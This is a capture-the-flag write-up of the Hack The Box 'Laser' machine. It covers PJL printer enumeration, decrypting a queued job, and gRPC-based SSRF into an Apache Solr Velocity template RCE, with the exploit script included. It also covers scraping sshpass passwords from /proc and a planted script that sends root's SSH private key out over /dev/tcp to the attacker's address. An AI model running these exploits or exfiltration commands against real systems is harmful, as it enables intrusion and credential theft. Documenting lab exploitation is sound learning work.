## HTB - Laser

## Overview

![](/assets/img/0-laser-infocard.png)

 This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me a lot longer to progress to the initial foothold than most boxes take to root!  This machine had some very interesting avenues of approach that greatly differed from the standard enumeration and progression that most of the lower difficulty machines require. I had to research new protocols just to begin, and by the end had to write five python scripts to progress through the initial foothold and for later privilege escalation.  All in all it was a fun, but very challenging ride!

## Useful Skills and Tools

### Using socat to redirect traffic to a port

* The command below will redirect traffic intended for the local machine's port 22 and send it to port 22 on the machine at IP 172.17.0.1.  

  ```text
  socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
  ```

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.201`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

```

The Nmap scan only showed three open ports: 22 - SSH, 9000, and 9001. I wasn't familiar with them so I searched for what uses ports 9000 and 9001.  It turns out these are commonly used by printers.

### Port 9000 & 9001

![](/assets/img/1-9000.png)

First I tried firing up a browser to see what kind of reply I might get from these ports.  9001 did not respond at all, while 9000 just sent back garbage characters \(probably binary information\).

```text

print

exit

```

Next, I connected with telnet but everything I sent just got back the reply `?`.  I did some further research to see what kind of vulnerabilities might be exposed by having these two ports open.  There was plenty of information on how to exploit open printers.

One of the sources pointed out that if you can access a printer and also SNMP, then the system is pretty much yours already.

Unfortunately, it seemed as if SNMP was not enabled on this machine \(or was using a non-standard port?\) as this would have given a good path forward.

### Printer Exploitation Toolkit \(PRET\)

After searching a bit more I came across a nice toolkit someone had put together for exploiting printers called the Printer Exploitation Toolkit \(PRET\).

Following the instructions, I was able to quickly get it up and running, and got a pret shell on the machine using the PS printer language. This only gave errors, so I switched to the PCL language and tried again.  This time I was able to use the `help` command to get a list of further options to try.

This is a virtual pclfs. Use 'put' to upload files.
```

Trying the `ls` command gave me an error message that said I could use `put` to upload files.  None of the other commands gave anything further.

> Due to its limited capabilities, PCL is hard to exploit from a security perspective unless one discovers interesting proprietary commands in some printer manufacturers's PCL flavour. The PRET tool implements a virtual, PCL-based file system which uses macros to save file content and metadata in the printer's memory. This hack shows that even a device which supports only minimalist page description languages like PCL can be used to store arbitrary files like copyright infringing material. Although turning a printer into a file sharing service is not a security vulnerability per se, it may apply as ‘misuse of service’ depending on the corporate policy.

After reading up about the difference between the printer languages I decided that this one probably didn't speak the binary language of vaporators...I mean PCL.

After testing all of the PCL commands and getting nothing I went back and tried the third language, PJL, and got another shell with many more commands available after using the `help` command.

```text

```

This time I was able to navigate the file structure.  In the folder `/pjl/jobs` there was a file named `queued`. 


> I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do this, unless you want to copy the extremely long base64 string and recreate the file yourself. Use **`get`** instead...


```text
10.10.10.201:/pjl/jobs> get queued
172199 bytes received.
```

**Use `get`**.  This will nicely download the file to your local machine.  However, when I opened the file it was still a wall of base64 encoded text so I tried to decode it.

```text
┌──(zweilos㉿kali)-[~/htb/laser/PRET]
└─$ echo queued | base64 -d > queued.decoded
base64: invalid input
```

After removing the extra characters \(that looked to indicate that it was supposed to be a python byte string\) from the file I tried to base64 decode it, but it still seemed to be invalid encoding.  I decided to keep enumerating to see if I could find anything to help me move forward.

```text

VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
0:     1755136    1718272    <HT>     <HT>  READ-WRITE
```

I did seem to have read-write access on the local drive.  I wondered if there was a way to write something malicious to the printer to execute code...

The `info` command seemed to give pretty much the same information as some of the other commands...meaning nothing useful.

```text

```

The `mirror` command seemed to be pretty interesting, as it created a mirror of the print queue on my local machine.  However, no one seemed to be sending new jobs to the printer.

### Decoding the `queued` file

```text

```

The `nvram` command had a dump operation which gave me what looked to be a possible encryption key. 

![](/assets/img/3-nvram-key-capture.png)

I wasn't sure that the output was showing everything I needed so I started Wireshark and did a packet capture to see what other data was being dumped.

```text
DATA = 49
DATA = 51
DATA = 118
DATA = 117
DATA = 57
DATA = 52
DATA = 114
DATA = 54
DATA = 46
DATA = 46
DATA = 54
DATA = 52
DATA = 51
DATA = 114
DATA = 118
DATA = 49
DATA = 57
DATA = 117
```

I got the above data points back from the capture.  They looked like decimal encoded characters to me.

![](/assets/img/4-nvram-key-capture-decode.png)

The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly from the `nvram` command. \(I'm also not sure what the `46` characters were in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)

```

After going through pretty much all of the commands and finding very little useful information, I went back to the `queued` file I had downloaded. Since I now had a potential encryption key and had noted the encryption method was AES... which outputs base64 encoded material that wont decode properly...I figured I was on to something.  I did some research to make sure I had all the information I needed to decode the file if it were AES-CBC encrypted.

* [https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode](https://crypto.stackexchange.com/questions/7935/does-the-iv-need-to-be-known-by-aes-cbc-mode)
* [https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256](https://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256)

```python
#!/usr/bin/env python3

import base64
from Crypto.Cipher import AES

with open("queued.stripped","r") as q64:
    #Need to base64 decode the original 'queued` file
    q = base64.b64decode(q64.read())
    #First 8 bytes are junk
    non_junk = q[8:]
    #The IV is the last 16 bytes appended
    iv = non_junk[:16]
    #The ciphertext is everything not junk and not IV
    ct = non_junk[16:]
    #create the cipher with the key
    cipher = AES.new('13vu94r6643rv19u', AES.MODE_CBC, iv)
    #decrypt the ct to plaintext
    pt = cipher.decrypt(ct)
    with open('q-out', 'wb') as out:
        out.write(pt)
```

I wrote a simple python script to decode the `queued` file after I stripped out the extraneous characters, and wrote it out to a file `q-out`.  It took a few tries to do since there was no IV.  I read that sometimes the IV is simply the last 16 byte section of the file, which worked to decode the file.  Since the file was an odd number of byte-chunks, I had to strip off the beginning extra bytes to get it to decode.

### The PDF document

The file that was in the print queue turned out to be a PDF document.

```text
Description
Used to parse the feeds from various sources (Printers, Network devices, Web servers and other
connected devices). These feeds can be used in checking load balancing, health status, tracing.
Usage
To streamline the process we are utilising the Protocol Buffers and gRPC framework.
The engine runs on 9000 port by default. All devices should submit the feeds in serialized format
such that data transmission is fast and accurate across network.
We defined a Print service which has a RPC method called Feed . This method takes Content
as input parameter and returns Data from the server.
The Content message definition specifies a field data and Data message definition specifies a
field feed .
On successful data transmission you should see a message....

return service_pb2.Data(feed='Pushing feeds')
...
Here is how a sample feed information looks like.
{
  "version": "v1.0",
  "title": "Printer Feed",
  "home_page_url": "http://printer.laserinternal.htb/",
  "feed_url": "http://printer.laserinternal.htb/feeds.json",
  "items": [
             {
               "id": "2",
               "content_text": "Queue jobs"
             },
             {
               "id": "1",
               "content_text": "Failed items"
             }
           ]
}
QA with Clients
Gabriel (Client) : What optimisation measures you've taken ?
Victor (Product Manager) : This is main aspect where we completely relied on gRPC
framework which has low latency, highly scalable and language independent.
John (Client) : What measures you take while processing the serialized feeds ?
Adam (Senior Developer) : Well, we placed controls on what gets unpickled. We don't use
builtins and any other modules.
Release Info
Currently we are working on v1.0 with basic feature which includes rendering feeds on
dashboard.
Bugs
1. Error handling in _InactiveRPCError
2. Connection timeout issues
3. Forking issues
4. Issue raised by clients in last updateTodo
1. Fork support to increase efficiency for more clients
2. Data delivery in more formats
3. Dashboard design and some data analytics
4. Merge staging core to feed engine
```

The PDF File contained instructions for interacting with a print API using gRPC on port 9000. It also contained the hostname `printer.laserinternal.htb` which I added to my `/etc/hosts` file. 

### The GRPC python client

Now that I knew what protocol to use to communicate with the server, I needed to figure out how it worked, and how to use this to enumerate the server more.

* [https://grpc.io/docs/languages/python/basics/](https://grpc.io/docs/languages/python/basics/)
* [https://grpc.io/docs/what-is-grpc/introduction/](https://grpc.io/docs/what-is-grpc/introduction/)
* [https://developers.google.com/protocol-buffers/docs/overview](https://developers.google.com/protocol-buffers/docs/overview)
* [https://developers.google.com/protocol-buffers/docs/proto3](https://developers.google.com/protocol-buffers/docs/proto3)
* [https://developers.google.com/protocol-buffers/docs/style](https://developers.google.com/protocol-buffers/docs/style)

```text
service FooService {
  rpc GetSomething(FooRequest) returns (FooResponse);
}
```

> The first line of the file specifies that you're using proto3 syntax: if you don't do this the protocol buffer compiler will assume you are using proto2. This must be the first non-empty, non-comment line of the file.

In the documentation for grpc and protocol buffers there were examples of how to communicate with this type of service using Python.

* [https://developers.google.com/protocol-buffers/docs/pythontutorial](https://developers.google.com/protocol-buffers/docs/pythontutorial) 
* [https://grpc.io/docs/languages/python/quickstart/](https://grpc.io/docs/languages/python/quickstart/)

```text
syntax = "proto3";

service Print {

    rpc Feed(Content) returns (Data) {}

}

message Content {

string data = 1;

}

message Data {

string feed = 1;

}
```

Using this information, and the information from the PDF document I recovered, I created the above `.proto` file to tell the grpc client how to communicate with this particular service.

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
```

Next I ran the command from the documentation for making the python libraries that would enable communication with the server. This created two files: `laser_pb2_grpc.py` and `laser_pb2.py`.

```python
import laser_pb2_grpc
import laser_pb2
import grpc
import base64
import pickle

def test():
    message = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "http://10.10.15.98:8099"}'
    enc_message = base64.b64encode(pickle.dumps(message))
    #Use insecure channel since we do not have credentials
    channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
    stub = laser_pb2_grpc.PrintStub(channel)
    response = stub.Feed(laser_pb2.Content(data=enc_message))
    print("Client received: " + response.message)

test()
```

I then created a python client `grpc_client.py` to connect to port 9000 on the server and send my request. I set the feed URL to be my machine to test the connection.  Next I created a netcat listener to catch the return message.

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$ nc -lvnp 8099

GET / HTTP/1.1
Host: 10.10.15.98:8099
User-Agent: FeedBot v1.0
Accept: */*
```

I got a connection back to my netcat listener, but I wasn't sure what to do with it at that point. However, since I was able to entice the server to send me connections with information I controlled I figured I could try to do a Server Side Request Forgery \(SSRF\) attack and maybe get it to pull a malicious file from my system.

```text
On successful data transmission you should see a message....
return service_pb2.Data(feed='Pushing feeds')
```

The PDF mentioned that I should get back the message `'Pushing feeds'`, but I did not get any messages back at all.  

```text

>
```

While doing some testing I forgot to start my listener, and got the above error message back since my computer refused the connection.  The verbose error message came in handy later.

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$ python3 grpc_client.py
Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')
```

After redirecting the target to be the internal machine I got an error message with a new hostname.  I added this to my `/etc/hosts` file.  Sending the traffic to this hostname did not resolve my connection errors.

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$ ping printer.laserinternal.htb

```

I was able to ping the machine using that hostname, so my connectivity wasn't the problem.

### Python port scanner - internal machine

I decided that there may possibly be an internal port open that I couldn't reach, therefore the errors. I needed some way of enumerating the inside.  Since I knew that a closed port gave a "Connection refused error" I was able to use this to filter responses.

* [https://www.geeksforgeeks.org/port-scanner-using-python/](https://www.geeksforgeeks.org/port-scanner-using-python/)

```python
import laser_pb2_grpc
import laser_pb2
import grpc
import base64
import pickle


def scan():
    #Run the below code for all 65535 ports (minus 0)
    for port in range(1,65535):
        print(f"Trying port: {port}", end ='\r', flush = True)

        #Use insecure channel since we do not have credentials
        channel = grpc.insecure_channel('printer.laserinternal.htb:9000')
        stub = laser_pb2_grpc.PrintStub(channel)

        #Testing to see if there are more ports open on the internal localhost using same message
        message = '{' + '"version": "v1.0", "title": "Printer Feed", ' + f'"feed_url": "http://localhost:{port}"' + '}'
        #print(f"Message sent is {message}")
        enc_message = base64.b64encode(pickle.dumps(message))
        content = laser_pb2.Content(data=enc_message)
        try:
            response = stub.Feed(content)

            #Print the ports that respond to our connection, along with the message
            print(f"Port {port} open!")
            print(f"Connection received on port: {port}",response)
            print("")
            #print(str(response))

        except Exception as e:
            #str_e = str(e)
            #print(f"There was an error: {str_e}")
            if 'Connection refused' in e.details():
                continue
            print(f"Port {port} open!")
            print(e.details())
            print("")

scan()
```

I used the `grpc_client.py` as a base to build the port scanner.  The scanner was very slow as it made a full connection, sent its message, and waited for a reply for every port. I thought about making the script multithreaded, but had to go out so I left it running instead.  


> I did find a good example of how to do a multi-threaded port scanner at [https://github.com/gh0x0st/python3\_multithreading](https://github.com/gh0x0st/python3_multithreading).  This person's code is also very clean and well structured so thanks to them for that in addition to the great examples!


```text

```

When I got back home I found that there were five ports open, and I noticed that port `8983` responded with the message of `feed: Pushing feeds` that was expected from the PDF.

### Solr exploitation

A search for port 8983 exploit led me to 

* [https://www.exploit-db.com/exploits/47572](https://www.exploit-db.com/exploits/47572)
* [https://github.com/veracode-research/solr-injection](https://github.com/veracode-research/solr-injection)
* [https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability](https://www.tenable.com/blog/cve-2019-17558-apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability)
* [https://github.com/jas502n/solr\_rce](https://github.com/jas502n/solr_rce)

Solr is an open source application from Apache which provides searching and indexing capabilities for large amounts of data.  Using the code from the exploit and my client from earlier I crafted a python script that would connect to the server, change the configuration to enable code execute, then allow for execution of arbitrary commands specified as arguments to the script.  

```python
import laser_pb2
import laser_pb2_grpc
import grpc
import base64
import pickle
import os
import sys
from func_timeout import func_set_timeout, FunctionTimedOut
from urllib.parse import quote

#this data set will configure the system to allow command execution
data1 = "gopher://localhost:8983/_POST /solr/staging/config HTTP/1.1%0D%0AHost:127.0.0.1:8983%0D%0AContent-Type: application/json%0D%0AContent-Length:218%0D%0A%0D%0A{'update-queryresponsewriter': {'startup': 'lazy', 'name':'velocity', 'class': 'solr.VelocityResponseWriter', 'template.base.dir': '','solr.resource.loader.enabled': 'true', 'params.resource.loader.enabled':'true'}"

#need to use 'quote' since the argument is a string inside quotes with spaces; otherwise will be parsed as separate arguments
#this is the command injection I will use on the system to get a reverse shell
cmd = quote(sys.argv[1])
data2 = f"http://localhost:8983/solr/staging/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"

#Can't use direct variable substitution since I have two different vars this time.  Use feed.replace() instead
feed = '{"version": "v1.0", "title": "Printer Feed", "feed_url": "replaceMe"}'

#no creds, so need insecure channel
channel = grpc.insecure_channel("10.10.10.201:9000")
stub = laser_pb2_grpc.PrintStub(channel)

#this @func_set_timeout(5) will make it so execution will continue after 5 seconds; This is needed since it hangs on this part otherwise
@func_set_timeout(5)
def configServer():
  #need to replace the word "replaceMe" from the feed with the configuration string data1
  feed = feed.replace("replaceMe", data1)
  serialized = base64.b64encode(pickle.dumps(feed))
  dataToPrint = stub.Feed(laser_pb2.Content(data = serialized))
  print(dataToPrint.feed)

def get_shell():
  #need to replace the word "replaceMe" from the feed with the command injection string data2
  feed = feed.replace("replaceMe", data2)
  serialized = base64.b64encode(pickle.dumps(feed))
  dataToPrint = stub.Feed(laser_pb2.Content(data = serialized))
  print(dataToPrint.feed)

try:
    #Need to put this in try/except since it definitely causes an exception, which we will ignore and pass
    configServer()
except:
    pass

get_shell()
```

After a lot of trial and error, I got my code to work and set up a netcat listener.  I made my payload a simple callback reverse shell and crossed my fingers.

## Initial Foothold

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$ nc -lvnp 8099

connect to [10.10.15.98] from (UNKNOWN) [10.10.10.201] 36790
python3 -c 'import pty;pty.spawn("/bin/bash")'
solr@laser:~$ id && hostname
uid=114(solr) gid=120(solr) groups=120(solr)
laser
```

I got a connection from the machine on my waiting nc listener!  I quickly upgraded my shell and checked what context I was logged in as.  I was a user named `solr`.  

```text
solr@laser:~$ echo 'ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNjkkEoBIEUE1qbriniZITFVwyL5zjbjJopB07xl9UAgAjbkTEx/IfL5xvd6cDNUHmW5KEkXTiNJm3sLBFfloVY=' >> .ssh/authorized_keys
```

Next, I put my public key in the `solr` user's `.ssh` folder so I could log in with a real shell.

I noticed in `/etc/passwd` that there were only two users who could log in, `solr` and `root`.

### User.txt

```text
solr@laser:~$ cd /home/solr
solr@laser:/home/solr$ ls -la
total 16
drwxr-xr-x 3 root root 4096 Jun 29 06:55 .

solr@laser:/home/solr$ cat user.txt 
1cc8750f9c5a710bc55718f7e7e2c762
```

The file `user.txt` was in `/home/solr` as expected, however I was confused at first since this was not the user's home directory.

```

After creating an SSH key I was able to log in. Upon login it told me the IP addresses for some interfaces, which I decided to check out, since docker containers often have security vulnerabilities.

```

There seemed to be a docker interface running on `172.17.0.1/16`, and potentially a container that looked to be hosted in the `172.18.0.1/16` range.

I checked for processes running that might give me an indication at what may have been running in the containers, and noticed an interesting process associated with a container hosted at 172.18.0.2.

### sshpass

```text
sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
```

Here, the sshpass program is being used to pass `root`'s password to SCP in order to move the file `jenkins-feed` to a folder on the docker container.  I opened the man page for sshpass to see if I could learn any more about how it worked and what it was doing.

> sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interactive" password authentication, but in non-interactive mode.
>
> ssh uses direct TTY access to make sure that the password is indeed issued by an interactive keyboard user. Sshpass runs ssh in a dedicated tty, fooling it into thinking it is getting the password from an interactive user.
>
> The command to run is specified after sshpass' own options. Typically it will be "ssh" with arguments, but it can just as well be any other command. The password prompt used by ssh is, however, currently hardcoded into sshpass.
>
> Options If no option is given, sshpass reads the password from the standard input. The user may give at most one alternative source for the password:
>
> ```text
>    -p password
>          The  password  is  given  on the command line. Please note the section titled "SECURITY CONSIDERATIONS".
> ```
>
> SECURITY CONSIDERATIONS First and foremost, users of sshpass should realize that ssh's insistance on only getting the password interactively is not without reason. It is close to impossible to securely store the password, and users of sshpass should consider whether ssh's public key authentication provides the same end-user experience, while involving less hassle and being more secure.
>
>   The  -p  option should be considered the least secure of all of sshpass's options.  **All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem.** Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.

Essentially it seemed as if this program was written to bypass the security of SSH's "user presence" check when passing plaintext passwords.  From the man page for `sshpass` I found information that points out that there is a vulnerability in the implementation of the `-p` option.  I tried searching on Google for more information about this race condition, but wasn't able to find anything related to exploiting this.  I decided to look around and see if the source code was available to see if I could determine what this race condition was caused by and if I could exploit it.  

I found the code for sshpass on GitHub: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)

![](/assets/img/8-sshpass-code.png)

```c
// Parse the command line. Fill in the "args" global struct with the results. Return argv offset
// on success, and a negative number on failure

    int opt;

    // Set the default password source to stdin
    args.pwtype=PWT_STDIN;
    args.pwsrc.fd=0;

#define VIRGIN_PWTYPE if( args.pwtype!=PWT_STDIN ) { \
    fprintf(stderr, "Conflicting password source\n"); \
    error=RETURN_CONFLICTING_ARGUMENTS; }

    while( (opt=getopt(argc, argv, "+f:d:p:P:heVv"))!=-1 && error==-1 ) {
    switch( opt ) {
    case 'f':
        // Password should come from a file
        VIRGIN_PWTYPE;

        args.pwtype=PWT_FILE;
        args.pwsrc.filename=optarg;

            {
                int i;

                for( i=0; optarg[i]!='\0'; ++i )
                    optarg[i]='z';
            }
        break;
        case 'P':

                fprintf(stderr, "sshpass: -e option given but SSHPASS environment variable not set\n");

                    "Using \"%s\" as the default password prompt indicator.\n", PACKAGE_STRING, PASSWORD_PROMPT );
        exit(0);
        break;
    }
    }

    if( error>=0 )
    return -(error+1);
    else
    return optind;
}
```

After analyzing the source code, I found out that the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command the password was being supplied to.  Since the command is originally input with the password in plaintext, the race condition exists where the plaintext password must be able to be read from memory prior to being obfuscated.

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$ echo -n zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz | wc -c
32
```

I copied the string of 'z's from the output to check its length.  The password was 32 characters long.  I tried logging in with `passwordpasswordpassword` but no luck...

### Getting root's password

```python
import os
while(1):
  pids = [x for x in os.listdir('/proc') if x.isdigit()]
  for pid in pids:
      if int(pid) > 10000:
        try:
          with open("/proc/%s/cmdline" % pid) as f:
            data = f.read()
        except EnvironmentError as e:
          #print(e)
          pass
        else:
          if data and 'sshpass' in data and 'zzz' not in data:
            print(repr(data))
            print("")
```

I wrote a python script to read the contents of each process in `/procs` and see if they had a `cmdline` file in them. If the file existed then it looked in the data for the word `sshpass`. Then, if it found that command it would check to see if that process also contained multiple 'z' characters, and if not, would print the command line that made that process.

```text
solr@laser:/dev/shm$ python3 get_pass.py
'sshpass\x00-p\x00c413d115b3d87664499624e7826d8c5a\x00scp\x00/opt/updates/files/graphql-feed\x00root@172.18.0.2:/root/feeds/\x00'
```

After waiting for quite some time, I got what I wanted. Cleaning up the output made the command:

```text
sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/graphql-feed root@172.18.0.2:/root/feeds/
```

The password was `c413d115b3d87664499624e7826d8c5a`.

```text
┌──(zweilos㉿kali)-[~/htb/laser]
└─$ echo -n c413d115b3d87664499624e7826d8c5a | wc -c                                
32
```

I verified the length of the password I found to make sure that it matched what I found earlier.

### Getting a root shell \(on the container\)

```text

Using this password and SSH I was able to log in as `root` to the docker container. Next I tried a standard docker container privilege escalation method where I mount the root filesytem into the container.

```text
solr@laser:~$ which docker
/usr/bin/docker
```

First I verified that the `docker` program was on the host system \(to copy to the container if need be\).

```text
solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/dev/shm/docker
root@172.18.0.2's password: 
docker                                                                  0%    0     0.0KB/s   --:-- ETAscp: /dev/shm/docker: No space left on device

```

Next I tried to copied the program to `/dev/shm` folder on the container, but unfortunately there was no space to copy the file.

```text
root@20e3289bc183:~# df

```

I used the `df` command on the container to verify open space, and noticed it was just running memory space that was full \(`/dev/shm`\).

```text
solr@laser:~$ scp /usr/bin/docker root@172.18.0.2:/tmp/docker
root@172.18.0.2's password: 
docker
```

Since there seemed to be plenty of free space elsewhere in the filesystem I copied the file to `/tmp` instead.

```text
solr@laser:~$ docker images
Got permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.40/images/json: dial unix /var/run/docker.sock: connect: permission denied
```

Unfortunately while trying to use this to escalate privileges I ran into two problems: the service was not running on the container and I couldn't start it because I didn't have privileges to work with containers on the host.

### clear.sh

I went back to reading some of the output I had gotten from my memory reading script to see if I noticed anything else that was useful.

```text
'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
```

While running my python script to find the password \(before I put the check for zzz's\) I noticed another process being run by `sshpass` that was executing a script `clear.sh` in the `/tmp` directory.  At first I thought it was trying to run the script from the container, but a closer look revealed that there was a separator `\x00` between `root@172.18.0.2` and `/tmp/clear.sh`.  This meant that the command was trying to log in to the container as root, then run the `clear.sh` script from the host's `/tmp` folder.

```text
solr@laser:/tmp$ vim /tmp/clear.sh
solr@laser:/tmp$ chmod +x /tmp/clear.sh
```

I checked the `/tmp` directory to see what this script did, but there was no script there.  This seemed like a perfect opportunity for me to supply one for them.  I made a script to copy `root`'s SSH key to my machine, since the process was running in the context of root \(verified by checking `ps aux` again\).  

```bash
#! /bin/bash

cat /root/.ssh/id_rsa > /dev/tcp/10.10.15.98/9099
```

My bash script was very simple, and just copied `root`'s SSH to my machine using TCP sockets

Since the process that was running the `clear.sh` script on the machine was owned by root, and since it was trying to run by connecting to port 22 on the container, I figured I needed a way to redirect that connection back to the local machine since there was no script named `clear.sh` there in the `/tmp` directory. This would give me the perfect opportunity to supply one for them for my own purposes.  After doing some research on how to redirect ports without using SSH, I found the easiest way was by using `socat`.  

* [https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)

```text
root@20e3289bc183:/tmp# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
2020/12/19 23:13:20 socat[1919] E bind(5, {AF=2 0.0.0.0:22}, 16): Address already in use
```

Using `socat` I tried to redirect port 22 traffic from the container to the host so it would execute but the port was already in use \(by SSH\).

```text
root@20e3289bc183:~# service ssh stop

```

Next, I stopped the SSH service to clear the port.

```text

```

For some reason I was unable to SSH in at one point while fixing up everything \(it took me a number of tries to get it to work properly, as there was something causing the connection to the container to timeout after a short time!\).  Running the command it mentioned in the error message:`ssh-keygen -f "/var/solr/.ssh/known_hosts" -R "172.18.0.2"` cleared the error and allowed me to log in again.

```text
root@20e3289bc183:~# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
```

The process that would run my malicious `clear.sh` also deleted my file, so I had to keep putting it back in place.  After recreating the script I started the `socat` redirect again.

I received the SSH key back at my waiting listener almost immediately after starting the `socat` redirect!

After that I logged in with the SSH key and collected my hard-earned proof!

```

In the root directory I also found the scripts that explained how this machine worked.

Thanks to [`MrR3boot`](https://app.hackthebox.eu/users/13531) & [`R4J`](https://app.hackthebox.eu/users/13243) for creating such a fun and interesting test of my python abilities.  I think this is the first time that I have had to write so many scripts for just one machine.  It was nice to learn about some new protocols, and also work in some API interaction as well.  

If you have comments, issues, or other feedback, or have any other fun or useful tips or tricks to share, feel free to contact me on Github at [https://github.com/zweilosec](https://github.com/zweilosec) or in the comments below!
